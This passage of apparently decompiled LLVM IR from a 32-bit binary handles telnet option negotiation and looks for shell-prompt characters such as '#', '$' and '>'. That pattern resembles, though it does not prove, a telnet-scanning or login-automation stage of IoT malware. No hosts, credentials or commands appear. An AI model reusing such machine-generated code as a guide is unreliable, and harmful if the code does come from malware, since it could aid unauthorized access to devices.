  br i1 %v1_804fffa, label %dec_label_pc_804ffc8, label %dec_label_pc_804fffc.backedge

dec_label_pc_804fffc.backedge:                    ; preds = %dec_label_pc_8050523.thread, %dec_label_pc_804fffc.loopexit12.loopexit, %dec_label_pc_805048e, %dec_label_pc_805023d, %dec_label_pc_80503d7, %dec_label_pc_805026e, %dec_label_pc_804fff9
  %v0_804fffc = phi i32 [ %v0_8050072, %dec_label_pc_804fff9 ], [ %v0_8050072, %dec_label_pc_805026e ], [ %v0_8050072, %dec_label_pc_80503d7 ], [ %v0_8050072, %dec_label_pc_805023d ], [ %v0_8050072, %dec_label_pc_805048e ], [ %v0_804fffc.pre.pre, %dec_label_pc_804fffc.loopexit12.loopexit ], [ %v0_8050072, %dec_label_pc_8050523.thread ]
  %v1_804fffc = add i32 %v0_804fffc, 12
  %v2_804fffc = inttoptr i32 %v1_804fffc to i32*
  %v3_804fffc = load i32, i32* %v2_804fffc, align 4
  store i32 %v3_804fffc, i32* %eax.global-to-local, align 4
  %v1_804ffff = icmp eq i32 %v3_804fffc, 0
  br i1 %v1_804ffff, label %dec_label_pc_804fece, label %dec_label_pc_804fffc.backedge.dec_label_pc_8050007_crit_edge

dec_label_pc_804fffc.backedge.dec_label_pc_8050007_crit_edge: ; preds = %dec_label_pc_804fffc.backedge
  %v1_805000a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050007

dec_label_pc_804fffc.loopexit12.loopexit:         ; preds = %dec_label_pc_8050523, %dec_label_pc_80501d5, %dec_label_pc_8050173, %dec_label_pc_8050072, %dec_label_pc_80504a3, %dec_label_pc_8050465, %dec_label_pc_80503ec, %dec_label_pc_80503ae, %dec_label_pc_805083f, %dec_label_pc_8050283, %dec_label_pc_8050245, %dec_label_pc_8050669, %dec_label_pc_8050200, %dec_label_pc_8050733, %dec_label_pc_804ffc0
  %v0_804fffc.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804fffc.backedge

dec_label_pc_8050007:                             ; preds = %dec_label_pc_804fffc.preheader, %dec_label_pc_804fffc.backedge.dec_label_pc_8050007_crit_edge
  %v1_805000a = phi i32 [ %v1_805000a.pre, %dec_label_pc_804fffc.backedge.dec_label_pc_8050007_crit_edge ], [ %v0_804febb, %dec_label_pc_804fffc.preheader ]
  %v0_8050007 = phi i32 [ %v0_804fffc, %dec_label_pc_804fffc.backedge.dec_label_pc_8050007_crit_edge ], [ %v0_804fffc25, %dec_label_pc_804fffc.preheader ]
  %v3_804fffc31 = phi i32 [ %v3_804fffc, %dec_label_pc_804fffc.backedge.dec_label_pc_8050007_crit_edge ], [ %v3_804fffc28, %dec_label_pc_804fffc.preheader ]
  %v1_8050007 = add i32 %v0_8050007, 28
  store i32 %v1_8050007, i32* %edx.global-to-local, align 4
  %v2_805000a = add i32 %v1_805000a, 8
  %v3_805000a = inttoptr i32 %v2_805000a to i32*
  store i32 %v1_8050007, i32* %v3_805000a, align 4
  %v0_805000e = load i32, i32* @edi, align 4
  %v1_805000e = add i32 %v0_805000e, 24
  %v2_805000e = inttoptr i32 %v1_805000e to i32*
  %v3_805000e = load i32, i32* %v2_805000e, align 4
  %v9_805000e = icmp eq i32 %v3_805000e, 256
  br i1 %v9_805000e, label %dec_label_pc_805063f, label %dec_label_pc_805001b

dec_label_pc_805001b:                             ; preds = %dec_label_pc_8050007, %dec_label_pc_805063f
  %v0_805001b = load i32, i32* @esp, align 4
  %v1_805001b = add i32 %v0_805001b, 24
  %v2_805001b = inttoptr i32 %v1_805001b to i32*
  %v3_805001b = load i32, i32* %v2_805001b, align 4
  store i32 %v3_805001b, i32* %eax.global-to-local, align 4
  %v1_805001f = add i32 %v0_805001b, 8
  %v2_805001f = inttoptr i32 %v1_805001f to i32*
  %v3_805001f = load i32, i32* %v2_805001f, align 4
  store i32 %v3_805001f, i32* %ebx.global-to-local, align 4
  %v1_8050023 = inttoptr i32 %v3_805001b to i32*
  store i32 0, i32* %v1_8050023, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v0_805002e = load i32, i32* @edi, align 4
  %v1_805002e = add i32 %v0_805002e, 24
  %v2_805002e = inttoptr i32 %v1_805002e to i32*
  %v3_805002e = load i32, i32* %v2_805002e, align 4
  store i32 %v3_805002e, i32* %edx.global-to-local, align 4
  %v0_8050031 = load i32, i32* @esp, align 4
  %v1_8050031 = add i32 %v0_8050031, -4
  %v2_8050031 = inttoptr i32 %v1_8050031 to i32*
  store i32 16384, i32* %v2_8050031, align 4
  %v0_8050036 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050036 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050036 = add i32 %v1_8050036, %v0_8050036
  store i32 %v2_8050036, i32* @ebx, align 4
  %v0_8050038 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050038 = sub i32 %v0_8050038, %v1_8050036
  store i32 %v2_8050038, i32* %eax.global-to-local, align 4
  %v2_805003a = add i32 %v0_8050031, -8
  %v3_805003a = inttoptr i32 %v2_805003a to i32*
  store i32 %v2_8050038, i32* %v3_805003a, align 4
  %v0_805003b = load i32, i32* @ebx, align 4
  %v2_805003b = add i32 %v0_8050031, -12
  %v3_805003b = inttoptr i32 %v2_805003b to i32*
  store i32 %v0_805003b, i32* %v3_805003b, align 4
  %v0_805003c = load i32, i32* @edi, align 4
  %v1_805003c = add i32 %v0_805003c, 4
  %v2_805003c = inttoptr i32 %v1_805003c to i32*
  %v3_805003c = load i32, i32* %v2_805003c, align 4
  %v2_805003f = add i32 %v0_8050031, -16
  %v3_805003f = inttoptr i32 %v2_805003f to i32*
  store i32 %v3_805003c, i32* %v3_805003f, align 4
  %v0_8050040 = call i32 @function_805214e()
  store i32 %v0_8050040, i32* %eax.global-to-local, align 4
  %v0_8050045 = load i32, i32* @esp, align 4
  %v1_8050045 = add i32 %v0_8050045, 16
  %tmp126 = icmp slt i32 %v0_8050040, 1
  br i1 %tmp126, label %dec_label_pc_80505d7, label %dec_label_pc_8050051

dec_label_pc_8050051:                             ; preds = %dec_label_pc_805001b
  store i32 0, i32* @edx, align 4
  br label %dec_label_pc_8050053

dec_label_pc_8050053:                             ; preds = %dec_label_pc_805005d, %dec_label_pc_8050051
  %v0_8050059 = phi i32 [ %v1_805005d, %dec_label_pc_805005d ], [ 0, %dec_label_pc_8050051 ]
  %v1_8050053 = load i32, i32* @ebx, align 4
  %v2_8050053 = add i32 %v1_8050053, %v0_8050059
  %v3_8050053 = inttoptr i32 %v2_8050053 to i8*
  %v4_8050053 = load i8, i8* %v3_8050053, align 1
  %v5_8050053 = icmp eq i8 %v4_8050053, 0
  %v1_8050057 = icmp eq i1 %v5_8050053, false
  br i1 %v1_8050057, label %dec_label_pc_805005d, label %dec_label_pc_8050059

dec_label_pc_8050059:                             ; preds = %dec_label_pc_8050053
  store i8 65, i8* %v3_8050053, align 1
  %v0_805005d.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805005d

dec_label_pc_805005d:                             ; preds = %dec_label_pc_8050053, %dec_label_pc_8050059
  %v0_805005d = phi i32 [ %v0_8050059, %dec_label_pc_8050053 ], [ %v0_805005d.pre, %dec_label_pc_8050059 ]
  %v1_805005d = add i32 %v0_805005d, 1
  store i32 %v1_805005d, i32* @edx, align 4
  %v12_805005e = icmp eq i32 %v0_8050040, %v1_805005d
  %v1_8050060 = icmp eq i1 %v12_805005e, false
  br i1 %v1_8050060, label %dec_label_pc_8050053, label %dec_label_pc_8050062

dec_label_pc_8050062:                             ; preds = %dec_label_pc_805005d, %dec_label_pc_80505dd
  %v0_8050062 = load i32, i32* @edi, align 4
  %v1_8050062 = add i32 %v0_8050062, 24
  %v2_8050062 = inttoptr i32 %v1_8050062 to i32*
  %v3_8050062 = load i32, i32* %v2_8050062, align 4
  %v2_8050065 = add i32 %v3_8050062, %v0_8050040
  store i32 %v2_8050065, i32* @ebx, align 4
  %v0_8050067 = load i32, i32* @global_var_8056190.34, align 16
  store i32 %v0_8050067, i32* %eax.global-to-local, align 4
  store i32 %v2_8050065, i32* %v2_8050062, align 4
  %v0_805006f = load i32, i32* %eax.global-to-local, align 4
  %v1_805006f = load i32, i32* @edi, align 4
  %v2_805006f = add i32 %v1_805006f, 8
  %v3_805006f = inttoptr i32 %v2_805006f to i32*
  store i32 %v0_805006f, i32* %v3_805006f, align 4
  br label %dec_label_pc_8050072

dec_label_pc_8050072:                             ; preds = %dec_label_pc_805038e, %dec_label_pc_8050062
  %v0_8050072 = load i32, i32* @edi, align 4
  %v1_8050072 = add i32 %v0_8050072, 12
  %v2_8050072 = inttoptr i32 %v1_8050072 to i32*
  %v3_8050072 = load i32, i32* %v2_8050072, align 4
  store i32 %v3_8050072, i32* %eax.global-to-local, align 4
  switch i32 %v3_8050072, label %dec_label_pc_804fffc.loopexit12.loopexit [
    i32 2, label %dec_label_pc_8050082
    i32 3, label %dec_label_pc_8050115
    i32 4, label %dec_label_pc_80501a0
    i32 5, label %dec_label_pc_804ffc0
    i32 6, label %dec_label_pc_8050245
    i32 7, label %dec_label_pc_80503ae
    i32 8, label %dec_label_pc_8050200
    i32 9, label %dec_label_pc_8050465
    i32 10, label %dec_label_pc_80502fc
  ]

dec_label_pc_8050082:                             ; preds = %dec_label_pc_8050072
  %v0_8050082 = load i32, i32* @esp, align 4
  %v1_8050082 = add i32 %v0_8050082, 8
  %v2_8050082 = inttoptr i32 %v1_8050082 to i32*
  %v3_8050082 = load i32, i32* %v2_8050082, align 4
  store i32 %v3_8050082, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v1_8050088 = add i32 %v0_8050072, 24
  %v2_8050088 = inttoptr i32 %v1_8050088 to i32*
  %v3_8050088 = load i32, i32* %v2_8050088, align 4
  store i32 %v3_8050088, i32* %edx.global-to-local, align 4
  %v2_805008b16 = sub i32 0, %v3_8050088
  %v10_805008b20 = and i32 %v3_8050088, %v2_805008b16
  %v11_805008b21 = icmp slt i32 %v10_805008b20, 0
  %v13_805008b23 = icmp slt i32 %v2_805008b16, 0
  %v2_805008d24 = icmp eq i1 %v13_805008b23, %v11_805008b21
  br i1 %v2_805008d24, label %dec_label_pc_8050523.thread, label %dec_label_pc_805008f.preheader

dec_label_pc_8050523.thread:                      ; preds = %dec_label_pc_8050082
  br label %dec_label_pc_804fffc.backedge

dec_label_pc_805008f.preheader:                   ; preds = %dec_label_pc_8050082, %dec_label_pc_805008b.backedge
  %v0_8050109115 = phi i32 [ %v0_8050109117, %dec_label_pc_805008b.backedge ], [ %v0_8050072, %dec_label_pc_8050082 ]
  %v0_805051b108 = phi i32 [ %v0_805008b, %dec_label_pc_805008b.backedge ], [ 0, %dec_label_pc_8050082 ]
  %v5_80500a1101 = phi i32 [ %v5_80500a1102, %dec_label_pc_805008b.backedge ], [ 2, %dec_label_pc_8050082 ]
  %v1_805009b99 = phi i32 [ %v1_805008b, %dec_label_pc_805008b.backedge ], [ %v3_8050088, %dec_label_pc_8050082 ]
  %v0_805009496 = phi i32 [ %v0_805009497, %dec_label_pc_805008b.backedge ], [ %v0_8050082, %dec_label_pc_8050082 ]
  br label %dec_label_pc_805008f

dec_label_pc_805008f:                             ; preds = %dec_label_pc_805008f.preheader, %dec_label_pc_80500e0
  %v0_8050109118 = phi i32 [ %v0_8050109115, %dec_label_pc_805008f.preheader ], [ %v0_80500f7, %dec_label_pc_80500e0 ]
  %v0_805051b = phi i32 [ %v0_805051b108, %dec_label_pc_805008f.preheader ], [ %v0_80500fd, %dec_label_pc_80500e0 ]
  %v5_80500a1 = phi i32 [ %v5_80500a1101, %dec_label_pc_805008f.preheader ], [ %v0_80500f2, %dec_label_pc_80500e0 ]
  %v1_805009b = phi i32 [ %v1_805009b99, %dec_label_pc_805008f.preheader ], [ %v3_80500f7, %dec_label_pc_80500e0 ]
  %v0_8050547 = phi i32 [ %v0_805009496, %dec_label_pc_805008f.preheader ], [ %v1_80500fa, %dec_label_pc_80500e0 ]
  %v0_805008f = load i32, i32* @ebx, align 4
  %v1_805008f = inttoptr i32 %v0_805008f to i8*
  %v2_805008f = load i8, i8* %v1_805008f, align 1
  %v12_805008f = icmp eq i8 %v2_805008f, -1
  %v1_8050092 = icmp eq i1 %v12_805008f, false
  br i1 %v1_8050092, label %dec_label_pc_8050101, label %dec_label_pc_8050094

dec_label_pc_8050094:                             ; preds = %dec_label_pc_805008f
  %v1_8050094 = add i32 %v0_8050547, 8
  %v2_8050094 = inttoptr i32 %v1_8050094 to i32*
  %v3_8050094 = load i32, i32* %v2_8050094, align 4
  %v1_8050098 = add i32 %v0_805008f, 1
  store i32 %v1_8050098, i32* @esi, align 4
  %v2_805009b = add i32 %v3_8050094, %v1_805009b
  store i32 %v2_805009b, i32* %ecx.global-to-local, align 4
  %tmp273 = icmp ugt i32 %v2_805009b, %v1_8050098
  br i1 %tmp273, label %dec_label_pc_80500a1, label %dec_label_pc_8050101

dec_label_pc_80500a1:                             ; preds = %dec_label_pc_8050094
  %v2_80500a1 = inttoptr i32 %v1_8050098 to i8*
  %v3_80500a1 = load i8, i8* %v2_80500a1, align 1
  %v4_80500a1 = zext i8 %v3_80500a1 to i32
  %v6_80500a1 = and i32 %v5_80500a1, -256
  %v7_80500a1 = or i32 %v4_80500a1, %v6_80500a1
  store i32 %v7_80500a1, i32* %eax.global-to-local, align 4
  %v11_80500a4 = icmp eq i8 %v3_80500a1, -1
  br i1 %v11_80500a4, label %dec_label_pc_8050518, label %dec_label_pc_80500ac

dec_label_pc_80500ac:                             ; preds = %dec_label_pc_80500a1
  %v11_80500ac = icmp eq i8 %v3_80500a1, -3
  br i1 %v11_80500ac, label %dec_label_pc_8050547, label %dec_label_pc_80500b4

dec_label_pc_80500b4:                             ; preds = %dec_label_pc_80500ac
  %v1_80500b4 = add i32 %v0_805008f, 2
  store i32 %v1_80500b4, i32* %eax.global-to-local, align 4
  %tmp274 = icmp ugt i32 %v2_805009b, %v1_80500b4
  br i1 %tmp274, label %dec_label_pc_80500bb, label %dec_label_pc_8050101

dec_label_pc_80500bb:                             ; preds = %dec_label_pc_80500b4, %dec_label_pc_805098d, %dec_label_pc_8050995, %dec_label_pc_80505cf
  %v0_80500bb = load i32, i32* @esi, align 4
  %v1_80500bb = inttoptr i32 %v0_80500bb to i8*
  %v2_80500bb = load i8, i8* %v1_80500bb, align 1
  %v3_80500bb = zext i8 %v2_80500bb to i32
  %v4_80500bb = load i32, i32* %eax.global-to-local, align 4
  %v5_80500bb = and i32 %v4_80500bb, -256
  %v6_80500bb = or i32 %v5_80500bb, %v3_80500bb
  store i32 %v6_80500bb, i32* %eax.global-to-local, align 4
  %v11_80500bd = icmp eq i8 %v2_80500bb, -3
  br i1 %v11_80500bd, label %dec_label_pc_8050530, label %dec_label_pc_80500c5

dec_label_pc_80500c5:                             ; preds = %dec_label_pc_80500bb
  %v11_80500c5 = icmp eq i8 %v2_80500bb, -5
  br i1 %v11_80500c5, label %dec_label_pc_8050637, label %dec_label_pc_80500cd

dec_label_pc_80500cd:                             ; preds = %dec_label_pc_80500c5, %dec_label_pc_8050637
  %v5_80500cd = phi i32 [ %v6_80500bb, %dec_label_pc_80500c5 ], [ %v5_80500cd.pre, %dec_label_pc_8050637 ]
  %v0_80500cd = load i32, i32* @ebx, align 4
  %v1_80500cd = add i32 %v0_80500cd, 2
  %v2_80500cd = inttoptr i32 %v1_80500cd to i8*
  %v3_80500cd = load i8, i8* %v2_80500cd, align 1
  %v4_80500cd = zext i8 %v3_80500cd to i32
  %v6_80500cd = and i32 %v5_80500cd, -256
  %v7_80500cd = or i32 %v4_80500cd, %v6_80500cd
  store i32 %v7_80500cd, i32* %eax.global-to-local, align 4
  %v11_80500d0 = icmp eq i8 %v3_80500cd, -3
  br i1 %v11_80500d0, label %dec_label_pc_805053e, label %dec_label_pc_80500d8

dec_label_pc_80500d8:                             ; preds = %dec_label_pc_8050530, %dec_label_pc_80500cd
  %v0_8050660 = phi i32 [ %v0_8050533, %dec_label_pc_8050530 ], [ %v0_80500cd, %dec_label_pc_80500cd ]
  %v0_80500d8 = phi i32 [ %v7_8050533, %dec_label_pc_8050530 ], [ %v7_80500cd, %dec_label_pc_80500cd ]
  %v1_80500d8 = trunc i32 %v0_80500d8 to i8
  %v11_80500d8 = icmp eq i8 %v1_80500d8, -5
  br i1 %v11_80500d8, label %dec_label_pc_8050660, label %dec_label_pc_80500e0

dec_label_pc_80500e0:                             ; preds = %dec_label_pc_80500d8, %dec_label_pc_8050660, %dec_label_pc_805053e
  %v0_80500e0 = load i32, i32* @esp, align 4
  %v1_80500e0 = add i32 %v0_80500e0, -4
  %v2_80500e0 = inttoptr i32 %v1_80500e0 to i32*
  store i32 16384, i32* %v2_80500e0, align 4
  %v1_80500e5 = add i32 %v0_80500e0, -8
  %v2_80500e5 = inttoptr i32 %v1_80500e5 to i32*
  store i32 3, i32* %v2_80500e5, align 4
  %v0_80500e7 = load i32, i32* @ebx, align 4
  %v2_80500e7 = add i32 %v0_80500e0, -12
  %v3_80500e7 = inttoptr i32 %v2_80500e7 to i32*
  store i32 %v0_80500e7, i32* %v3_80500e7, align 4
  %v0_80500e8 = load i32, i32* @ebp, align 4
  %v1_80500e8 = add i32 %v0_80500e8, 3
  store i32 %v1_80500e8, i32* @ebp, align 4
  %v0_80500eb = load i32, i32* @edi, align 4
  %v1_80500eb = add i32 %v0_80500eb, 4
  %v2_80500eb = inttoptr i32 %v1_80500eb to i32*
  %v3_80500eb = load i32, i32* %v2_80500eb, align 4
  store i32 %v3_80500eb, i32* %edx.global-to-local, align 4
  %v0_80500ee = load i32, i32* @ebx, align 4
  %v1_80500ee = add i32 %v0_80500ee, 3
  store i32 %v1_80500ee, i32* @ebx, align 4
  %v2_80500f1 = add i32 %v0_80500e0, -16
  %v3_80500f1 = inttoptr i32 %v2_80500f1 to i32*
  store i32 %v3_80500eb, i32* %v3_80500f1, align 4
  %v0_80500f2 = call i32 @function_80521c4()
  store i32 %v0_80500f2, i32* %eax.global-to-local, align 4
  %v0_80500f7 = load i32, i32* @edi, align 4
  %v1_80500f7 = add i32 %v0_80500f7, 24
  %v2_80500f7 = inttoptr i32 %v1_80500f7 to i32*
  %v3_80500f7 = load i32, i32* %v2_80500f7, align 4
  store i32 %v3_80500f7, i32* %edx.global-to-local, align 4
  %v0_80500fa = load i32, i32* @esp, align 4
  %v1_80500fa = add i32 %v0_80500fa, 16
  %v0_80500fd = load i32, i32* @ebp, align 4
  %v2_80500fd = sub i32 %v0_80500fd, %v3_80500f7
  %v8_80500fd = xor i32 %v0_80500fd, %v3_80500f7
  %v9_80500fd = xor i32 %v2_80500fd, %v0_80500fd
  %v10_80500fd = and i32 %v9_80500fd, %v8_80500fd
  %v11_80500fd = icmp slt i32 %v10_80500fd, 0
  %v13_80500fd = icmp slt i32 %v2_80500fd, 0
  %v2_80500ff = icmp eq i1 %v13_80500fd, %v11_80500fd
  br i1 %v2_80500ff, label %dec_label_pc_8050101, label %dec_label_pc_805008f

dec_label_pc_8050101:                             ; preds = %dec_label_pc_805008b.backedge, %dec_label_pc_80500b4, %dec_label_pc_8050094, %dec_label_pc_80500e0, %dec_label_pc_805008f, %dec_label_pc_8050547.dec_label_pc_8050101.loopexit_crit_edge
  %v0_8050109 = phi i32 [ %v0_80505ab, %dec_label_pc_8050547.dec_label_pc_8050101.loopexit_crit_edge ], [ %v0_80500f7, %dec_label_pc_80500e0 ], [ %v0_8050109118, %dec_label_pc_80500b4 ], [ %v0_8050109118, %dec_label_pc_8050094 ], [ %v0_8050109118, %dec_label_pc_805008f ], [ %v0_8050109117, %dec_label_pc_805008b.backedge ]
  %v0_8050101 = phi i32 [ %v0_8050101.pre.pre, %dec_label_pc_8050547.dec_label_pc_8050101.loopexit_crit_edge ], [ %v0_80500fd, %dec_label_pc_80500e0 ], [ %v0_805051b, %dec_label_pc_80500b4 ], [ %v0_805051b, %dec_label_pc_8050094 ], [ %v0_805051b, %dec_label_pc_805008f ], [ %v0_805008b, %dec_label_pc_805008b.backedge ]
  %tmp127 = icmp slt i32 %v0_8050101, 1
  br i1 %tmp127, label %dec_label_pc_8050523, label %dec_label_pc_8050109

dec_label_pc_8050109:                             ; preds = %dec_label_pc_8050101
  %v1_8050109 = add i32 %v0_8050109, 12
  %v2_8050109 = inttoptr i32 %v1_8050109 to i32*
  store i32 3, i32* %v2_8050109, align 4
  br label %dec_label_pc_8050383

dec_label_pc_8050115:                             ; preds = %dec_label_pc_8050072
  %v1_8050115 = add i32 %v0_8050072, 24
  %v2_8050115 = inttoptr i32 %v1_8050115 to i32*
  %v3_8050115 = load i32, i32* %v2_8050115, align 4
  store i32 %v3_8050115, i32* %ecx.global-to-local, align 4
  %v1_8050118 = add i32 %v3_8050115, -1
  store i32 %v1_8050118, i32* %eax.global-to-local, align 4
  %tmp128 = icmp slt i32 %v1_8050118, 1
  br i1 %tmp128, label %dec_label_pc_8050153, label %dec_label_pc_805011f.preheader

dec_label_pc_805011f.preheader:                   ; preds = %dec_label_pc_8050115
  %v7_805011f.pre = load i32, i32* @edx, align 4
  %v2_805011f = add i32 %v0_8050072, 28
  br label %dec_label_pc_805011f

dec_label_pc_805011f:                             ; preds = %dec_label_pc_805011f.preheader, %dec_label_pc_8050150
  %v7_805011f = phi i32 [ %v7_805011f.pre, %dec_label_pc_805011f.preheader ], [ %v9_805011f, %dec_label_pc_8050150 ]
  %v0_80506e2 = phi i32 [ %v1_8050118, %dec_label_pc_805011f.preheader ], [ %v1_8050150, %dec_label_pc_8050150 ]
  %v3_805011f = add i32 %v2_805011f, %v0_80506e2
  %v4_805011f = inttoptr i32 %v3_805011f to i8*
  %v5_805011f = load i8, i8* %v4_805011f, align 1
  %v6_805011f = zext i8 %v5_805011f to i32
  %v8_805011f = and i32 %v7_805011f, -256
  %v9_805011f = or i32 %v6_805011f, %v8_805011f
  store i32 %v9_805011f, i32* %edx.global-to-local, align 4
  %v10_8050123 = icmp eq i8 %v5_805011f, 58
  br i1 %v10_8050123, label %dec_label_pc_80506e2, label %dec_label_pc_805012c

dec_label_pc_805012c:                             ; preds = %dec_label_pc_805011f
  %v10_805012c = icmp eq i8 %v5_805011f, 62
  br i1 %v10_805012c, label %dec_label_pc_80506e2, label %dec_label_pc_8050135

dec_label_pc_8050135:                             ; preds = %dec_label_pc_805012c
  %v10_8050135 = icmp eq i8 %v5_805011f, 36
  br i1 %v10_8050135, label %dec_label_pc_80506e2, label %dec_label_pc_805013e

dec_label_pc_805013e:                             ; preds = %dec_label_pc_8050135
  %v10_805013e = icmp eq i8 %v5_805011f, 35
  br i1 %v10_805013e, label %dec_label_pc_80506e2, label %dec_label_pc_8050147

dec_label_pc_8050147:                             ; preds = %dec_label_pc_805013e
  %v10_8050147 = icmp eq i8 %v5_805011f, 37
  br i1 %v10_8050147, label %dec_label_pc_80506e2, label %dec_label_pc_8050150

dec_label_pc_8050150:                             ; preds = %dec_label_pc_8050147
  %v1_8050150 = add i32 %v0_80506e2, -1
  %v8_8050150 = icmp eq i32 %v1_8050150, 0
  store i32 %v1_8050150, i32* %eax.global-to-local, align 4
  %v1_8050151 = icmp eq i1 %v8_8050150, false
  br i1 %v1_8050151, label %dec_label_pc_805011f, label %dec_label_pc_8050153

dec_label_pc_8050153:                             ; preds = %dec_label_pc_8050150, %dec_label_pc_80506e2, %dec_label_pc_8050115
  %v0_8050153 = load i32, i32* @esp, align 4
  %v1_8050153 = add i32 %v0_8050153, -4
  %v2_8050153 = inttoptr i32 %v1_8050153 to i32*
  store i32 4, i32* %v2_8050153, align 4
  %v1_8050155 = add i32 %v0_8050153, -8
  %v2_8050155 = inttoptr i32 %v1_8050155 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_805458e.49 to i32), i32* %v2_8050155, align 4
  %v0_805015a = load i32, i32* %ecx.global-to-local, align 4
  %v2_805015a = add i32 %v0_8050153, -12
  %v3_805015a = inttoptr i32 %v2_805015a to i32*
  store i32 %v0_805015a, i32* %v3_805015a, align 4
  %v1_805015b = add i32 %v0_8050153, 8
  %v2_805015b = inttoptr i32 %v1_805015b to i32*
  %v3_805015b = load i32, i32* %v2_805015b, align 4
  store i32 %v3_805015b, i32* %eax.global-to-local, align 4
  %v2_805015f = add i32 %v0_8050153, -16
  %v3_805015f = inttoptr i32 %v2_805015f to i32*
  store i32 %v3_805015b, i32* %v3_805015f, align 4
  %v0_8050160 = call i32 @function_8051590()
  store i32 %v0_8050160, i32* %eax.global-to-local, align 4
  %v0_8050165 = load i32, i32* @esp, align 4
  store i32 %v0_8050160, i32* @ebp, align 4
  %v10_805016a = icmp eq i32 %v0_8050160, -1
  %v1_805016d = icmp eq i1 %v10_805016a, false
  br i1 %v1_805016d, label %dec_label_pc_80506ee, label %dec_label_pc_8050173

dec_label_pc_8050173:                             ; preds = %dec_label_pc_8050153
  %v1_8050173 = add i32 %v0_8050165, 12
  %v2_8050173 = inttoptr i32 %v1_8050173 to i32*
  store i32 5, i32* %v2_8050173, align 4
  %v1_8050175 = add i32 %v0_8050165, 8
  %v2_8050175 = inttoptr i32 %v1_8050175 to i32*
  store i32 ptrtoint ([6 x i8]* @global_var_8054593.50 to i32), i32* %v2_8050175, align 4
  %v0_805017a = load i32, i32* @edi, align 4
  %v1_805017a = add i32 %v0_805017a, 24
  %v2_805017a = inttoptr i32 %v1_805017a to i32*
  %v3_805017a = load i32, i32* %v2_805017a, align 4
  store i32 %v3_805017a, i32* %eax.global-to-local, align 4
  %v2_805017d = add i32 %v0_8050165, 4
  %v3_805017d = inttoptr i32 %v2_805017d to i32*
  store i32 %v3_805017a, i32* %v3_805017d, align 4
  %v1_805017e = add i32 %v0_8050165, 24
  %v2_805017e = inttoptr i32 %v1_805017e to i32*
  %v3_805017e = load i32, i32* %v2_805017e, align 4
  store i32 %v3_805017e, i32* %eax.global-to-local, align 4
  %v3_8050182 = inttoptr i32 %v0_8050165 to i32*
  store i32 %v3_805017e, i32* %v3_8050182, align 4
  %v0_8050183 = call i32 @function_8051590()
  store i32 %v0_8050183, i32* %eax.global-to-local, align 4
  store i32 %v0_8050183, i32* @ebp, align 4
  %v10_805018d = icmp eq i32 %v0_8050183, -1
  %v1_8050190 = icmp eq i1 %v10_805018d, false
  br i1 %v1_8050190, label %dec_label_pc_80506ee, label %dec_label_pc_804fffc.loopexit12.loopexit

dec_label_pc_80501a0:                             ; preds = %dec_label_pc_8050072
  %v1_80501a0 = add i32 %v0_8050072, 24
  %v2_80501a0 = inttoptr i32 %v1_80501a0 to i32*
  %v3_80501a0 = load i32, i32* %v2_80501a0, align 4
  store i32 %v3_80501a0, i32* %ecx.global-to-local, align 4
  %v1_80501a3 = add i32 %v3_80501a0, -1
  store i32 %v1_80501a3, i32* %eax.global-to-local, align 4
  %tmp129 = icmp slt i32 %v1_80501a3, 1
  br i1 %tmp129, label %dec_label_pc_80501d5, label %dec_label_pc_80501aa.preheader

dec_label_pc_80501aa.preheader:                   ; preds = %dec_label_pc_80501a0
  %v7_80501aa.pre = load i32, i32* @edx, align 4
  %v2_80501aa = add i32 %v0_8050072, 28
  br label %dec_label_pc_80501aa

dec_label_pc_80501aa:                             ; preds = %dec_label_pc_80501aa.preheader, %dec_label_pc_80501d2
  %v7_80501aa = phi i32 [ %v7_80501aa.pre, %dec_label_pc_80501aa.preheader ], [ %v9_80501aa, %dec_label_pc_80501d2 ]
  %v0_80507ac = phi i32 [ %v1_80501a3, %dec_label_pc_80501aa.preheader ], [ %v1_80501d2, %dec_label_pc_80501d2 ]
  %v3_80501aa = add i32 %v2_80501aa, %v0_80507ac
  %v4_80501aa = inttoptr i32 %v3_80501aa to i8*
  %v5_80501aa = load i8, i8* %v4_80501aa, align 1
  %v6_80501aa = zext i8 %v5_80501aa to i32
  %v8_80501aa = and i32 %v7_80501aa, -256
  %v9_80501aa = or i32 %v6_80501aa, %v8_80501aa
  store i32 %v9_80501aa, i32* %edx.global-to-local, align 4
  %v10_80501ae = icmp eq i8 %v5_80501aa, 58
  br i1 %v10_80501ae, label %dec_label_pc_80507ac, label %dec_label_pc_80501b7

dec_label_pc_80501b7:                             ; preds = %dec_label_pc_80501aa
  %v10_80501b7 = icmp eq i8 %v5_80501aa, 62
  br i1 %v10_80501b7, label %dec_label_pc_80507ac, label %dec_label_pc_80501c0

dec_label_pc_80501c0:                             ; preds = %dec_label_pc_80501b7
  %v10_80501c0 = icmp eq i8 %v5_80501aa, 36
  br i1 %v10_80501c0, label %dec_label_pc_80507ac, label %dec_label_pc_80501c9

dec_label_pc_80501c9:                             ; preds = %dec_label_pc_80501c0
  %v10_80501c9 = icmp eq i8 %v5_80501aa, 35
  br i1 %v10_80501c9, label %dec_label_pc_80507ac, label %dec_label_pc_80501d2

dec_label_pc_80501d2:                             ; preds = %dec_label_pc_80501c9
  %v1_80501d2 = add i32 %v0_80507ac, -1
  %v8_80501d2 = icmp eq i32 %v1_80501d2, 0
  store i32 %v1_80501d2, i32* %eax.global-to-local, align 4
  %v1_80501d3 = icmp eq i1 %v8_80501d2, false
  br i1 %v1_80501d3, label %dec_label_pc_80501aa, label %dec_label_pc_80501d5

dec_label_pc_80501d5:                             ; preds = %dec_label_pc_80501d2, %dec_label_pc_80507ac, %dec_label_pc_80501a0
  %v0_80501d5 = load i32, i32* @esp, align 4
  %v1_80501d5 = add i32 %v0_80501d5, -4
  %v2_80501d5 = inttoptr i32 %v1_80501d5 to i32*
  store i32 7, i32* %v2_80501d5, align 4
  %v1_80501d7 = add i32 %v0_80501d5, -8
  %v2_80501d7 = inttoptr i32 %v1_80501d7 to i32*
  store i32 ptrtoint ([8 x i8]* @global_var_8054599.51 to i32), i32* %v2_80501d7, align 4
  %v0_80501dc = load i32, i32* %ecx.global-to-local, align 4
